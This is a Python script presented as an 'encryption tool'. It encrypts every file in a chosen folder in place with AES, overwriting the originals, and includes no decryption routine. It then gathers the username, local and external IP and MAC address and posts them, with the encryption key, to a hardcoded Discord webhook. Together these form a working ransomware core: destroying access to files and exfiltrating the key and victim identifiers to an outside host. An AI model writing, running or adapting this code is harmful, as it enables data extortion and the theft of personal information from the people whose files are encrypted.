"""
Author: Hiroshi Thomas
Date: 5/17/24
Description: Python Encryption Tool that sends host info and key via discord webhook

This script is licensed under the MIT License.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import secrets
import socket
import requests
from uuid import getnode as get_mac
from tkinter import Tk, filedialog
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def generate_key() -> str:
    return secrets.token_urlsafe(48)  # Generates a random URL-safe text string, suitable for use as a key.

def encrypt_file(file_path: str, key: bytes, iv: bytes):
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(file_path, 'wb') as file:
        file.write(iv + ciphertext)

def encrypt_directory(directory_path: str, key: bytes):
    key = key[:32]  # Ensure the key is the correct length for AES
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            iv = os.urandom(16)
            encrypt_file(file_path, key, iv)

def get_system_info():
    username = os.getlogin()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    mac_address = ':'.join(['{:02x}'.format((get_mac() >> elements) & 0xff) for elements in range(0, 8*6, 8)][::-1])
    
    try:
        external_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
    except requests.RequestException as e:
        external_ip = 'N/A'
    
    return username, ip_address, mac_address, external_ip

def send_info_to_webhook(key: str, username: str, ip_address: str, mac_address: str, external_ip: str, webhook_url: str):
    data = {
        "content": f"Encryption Key: {key}\nUsername: {username}\nIP Address: {ip_address}\nMAC Address: {mac_address}\nExternal IP: {external_ip}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Information sent to webhook successfully.")
        else:
            print(f"Failed to send information to webhook: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending the information to the webhook: {e}")

def browse_folder():
    root = Tk()
    root.withdraw()
    folder_path = filedialog.askdirectory()
    return folder_path

def main():
    key = generate_key()
    key_bytes = key.encode()[:32]  # Ensure key is 32 bytes for AES

    username, ip_address, mac_address, external_ip = get_system_info()

    folder_path = browse_folder()
    if folder_path:
        encrypt_directory(folder_path, key_bytes)
        print(f"Directory {folder_path} encrypted successfully.")
        send_info_to_webhook(key, username, ip_address, mac_address, external_ip, "https://discord.com/api/webhooks/1249724244372492289/7UrgwjzhQ9ZJQF7_WgoGwhD-Aa5vqJTZEmLVBBrEJSOUxhwgZz0VJidncV4gt5O2A4Ef")
    else:
        print("No folder selected.")

if __name__ == "__main__":
    main()
